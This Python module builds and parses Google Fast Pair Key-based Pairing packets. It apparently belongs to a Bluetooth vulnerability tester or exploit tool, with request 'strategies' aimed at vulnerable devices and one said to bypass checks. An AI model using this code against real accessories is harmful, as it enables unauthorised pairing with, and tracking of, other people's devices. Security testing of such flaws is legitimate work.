"""
Fast Pair Protocol Message Builders

Constructs the binary packets for Key-based Pairing according to the
Google Fast Pair specification.

Reference: https://developers.google.com/nearby/fast-pair/specifications/characteristics
"""

from __future__ import annotations

import os
import struct
from dataclasses import dataclass
from enum import IntFlag
from typing import Optional

from .constants import MessageType


class PairingRequestFlags(IntFlag):
    NONE = 0x00
    INITIATE_BONDING = 0x01
    SEEKER_ADDRESS_PRESENT = 0x02
    RESERVED_2 = 0x04
    ALT_SEEKER_ADDRESS = 0x08
    EXTENDED_RESPONSE = 0x10
    SUBSEQUENT_PAIRING = 0x20
    RETROACTIVE_ACCOUNT_KEY = 0x40
    RESERVED_7 = 0x80


@dataclass
class KeyBasedPairingRequest:
    """
    Key-based Pairing Request packet (16 bytes when encrypted)
    
    Byte layout (before encryption):
    [0]     Message Type (0x00)
    [1]     Flags
    [2-7]   Provider's BR/EDR or BLE address (6 bytes)
    [8-13]  Seeker's BR/EDR address (optional, only if flag bit 1 set)
    [14-15] Random salt (2 bytes minimum)
    
    If Seeker address not present, bytes 8-15 are random padding/salt.
    """
    provider_address: bytes
    seeker_address: Optional[bytes] = None
    flags: PairingRequestFlags = PairingRequestFlags.INITIATE_BONDING
    salt: Optional[bytes] = None

    def __post_init__(self):
        if len(self.provider_address) != 6:
            raise ValueError("Provider address must be 6 bytes")
        if self.seeker_address and len(self.seeker_address) != 6:
            raise ValueError("Seeker address must be 6 bytes")

    def build(self) -> bytes:
        """Build the 16-byte plaintext request packet"""
        packet = bytearray(16)

        packet[0] = MessageType.KEY_BASED_PAIRING_REQUEST

        flags = self.flags
        if self.seeker_address:
            flags |= PairingRequestFlags.SEEKER_ADDRESS_PRESENT
        packet[1] = int(flags)

        packet[2:8] = self.provider_address

        if self.seeker_address:
            packet[8:14] = self.seeker_address
            salt = self.salt or os.urandom(2)
            packet[14:16] = salt[:2]
        else:
            salt = self.salt or os.urandom(8)
            packet[8:16] = salt[:8]

        return bytes(packet)

    @classmethod
    def for_verification(
        cls,
        provider_address: bytes,
        seeker_address: Optional[bytes] = None,
    ) -> "KeyBasedPairingRequest":
        """
        Build standard verification request matching Android VulnerabilityTester.kt:
        Flags: 0x11 = INITIATE_BONDING (bit 0) | EXTENDED_RESPONSE (bit 4)
        """
        return cls(
            provider_address=provider_address,
            seeker_address=seeker_address,
            flags=PairingRequestFlags.INITIATE_BONDING | PairingRequestFlags.EXTENDED_RESPONSE,
        )

    @classmethod
    def strategy_raw_kbp(cls, provider_address: bytes) -> "KeyBasedPairingRequest":
        """Strategy 1: RAW_KBP - Minimal raw request (works on most vulnerable devices)"""
        return cls(
            provider_address=provider_address,
            seeker_address=None,
            flags=PairingRequestFlags.INITIATE_BONDING | PairingRequestFlags.EXTENDED_RESPONSE,
        )

    @classmethod
    def strategy_with_seeker(
        cls, provider_address: bytes, seeker_address: bytes
    ) -> "KeyBasedPairingRequest":
        """Strategy 2: RAW_WITH_SEEKER - Includes seeker address for bonding"""
        return cls(
            provider_address=provider_address,
            seeker_address=seeker_address,
            flags=PairingRequestFlags.SEEKER_ADDRESS_PRESENT,
        )

    @classmethod
    def strategy_retroactive(
        cls, provider_address: bytes, seeker_address: bytes
    ) -> "KeyBasedPairingRequest":
        """Strategy 3: RETROACTIVE - Bypasses some checks (flags 0x0A = bit1 + bit3)"""
        return cls(
            provider_address=provider_address,
            seeker_address=seeker_address,
            flags=PairingRequestFlags.SEEKER_ADDRESS_PRESENT | PairingRequestFlags.ALT_SEEKER_ADDRESS,
        )

    @classmethod
    def strategy_extended(cls, provider_address: bytes) -> "KeyBasedPairingRequest":
        """Strategy 4: EXTENDED - Request extended response for newer devices"""
        return cls(
            provider_address=provider_address,
            seeker_address=None,
            flags=PairingRequestFlags.EXTENDED_RESPONSE,
        )


@dataclass
class KeyBasedPairingResponse:
    message_type: int
    provider_address: bytes
    salt: bytes

    @classmethod
    def parse(cls, decrypted_data: bytes) -> "KeyBasedPairingResponse":
        if len(decrypted_data) != 16:
            raise ValueError("Response must be 16 bytes")

        message_type = decrypted_data[0]
        provider_address = decrypted_data[1:7]
        salt = decrypted_data[7:16]

        return cls(
            message_type=message_type,
            provider_address=provider_address,
            salt=salt,
        )

    @property
    def provider_address_str(self) -> str:
        return ":".join(f"{b:02X}" for b in self.provider_address)


def parse_kbp_response_multi_strategy(
    data: bytes,
    shared_secret: Optional[bytes] = None,
) -> Optional[str]:
    """
    Multi-strategy response parser matching Android FastPairExploit.kt parseKbpResponse().
    Tries multiple methods to extract BR/EDR address from response.
    Returns MAC address string or None if extraction fails.
    """
    if len(data) < 7:
        return None

    def extract_address(d: bytes, offset: int) -> str:
        if offset + 6 > len(d):
            return "00:00:00:00:00:00"
        return ":".join(f"{d[i]:02X}" for i in range(offset, offset + 6))

    def is_valid_address(addr: str) -> bool:
        if addr in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF"):
            return False
        parts = addr.split(":")
        return len(parts) == 6 and all(len(p) == 2 for p in parts)

    # Strategy 1: Standard response (type 0x01)
    if data[0] in (0x01, MessageType.KEY_BASED_PAIRING_RESPONSE):
        addr = extract_address(data, 1)
        if is_valid_address(addr):
            return addr

    # Strategy 2: Extended response (type 0x02)
    if data[0] == 0x02 and len(data) >= 9:
        addr_count = data[2] & 0xFF
        if addr_count >= 1:
            addr = extract_address(data, 3)
            if is_valid_address(addr):
                return addr

    # Strategy 3: Decrypt with shared secret
    if shared_secret and len(shared_secret) >= 16:
        try:
            from .crypto import aes_128_decrypt
            decrypted = aes_128_decrypt(shared_secret[:16], data)
            if decrypted[0] == MessageType.KEY_BASED_PAIRING_RESPONSE:
                addr = extract_address(decrypted, 1)
                if is_valid_address(addr):
                    return addr
        except Exception:
            pass

    # Strategy 4: Brute force scan for valid MAC pattern
    for offset in range(len(data) - 5):
        addr = extract_address(data, offset)
        if is_valid_address(addr):
            return addr

    return None


@dataclass  
class PasskeyBlock:
    message_type: int
    passkey: int
    salt: bytes

    def build(self) -> bytes:
        packet = bytearray(16)
        packet[0] = self.message_type
        packet[1:4] = self.passkey.to_bytes(3, byteorder="big")
        packet[4:16] = self.salt or os.urandom(12)
        return bytes(packet)

    @classmethod
    def parse(cls, decrypted_data: bytes) -> "PasskeyBlock":
        if len(decrypted_data) != 16:
            raise ValueError("Passkey block must be 16 bytes")

        message_type = decrypted_data[0]
        passkey = int.from_bytes(decrypted_data[1:4], byteorder="big")
        salt = decrypted_data[4:16]

        return cls(
            message_type=message_type,
            passkey=passkey,
            salt=salt,
        )

    @classmethod
    def create_seeker_passkey(cls, passkey: int) -> "PasskeyBlock":
        return cls(
            message_type=0x02,
            passkey=passkey,
            salt=os.urandom(12),
        )


def parse_bluetooth_address(address_str: str) -> bytes:
    """Convert 'AA:BB:CC:DD:EE:FF' format to 6 bytes"""
    parts = address_str.replace("-", ":").split(":")
    if len(parts) != 6:
        raise ValueError(f"Invalid Bluetooth address: {address_str}")
    return bytes(int(p, 16) for p in parts)


def format_bluetooth_address(address_bytes: bytes) -> str:
    """Convert 6 bytes to 'AA:BB:CC:DD:EE:FF' format"""
    return ":".join(f"{b:02X}" for b in address_bytes)
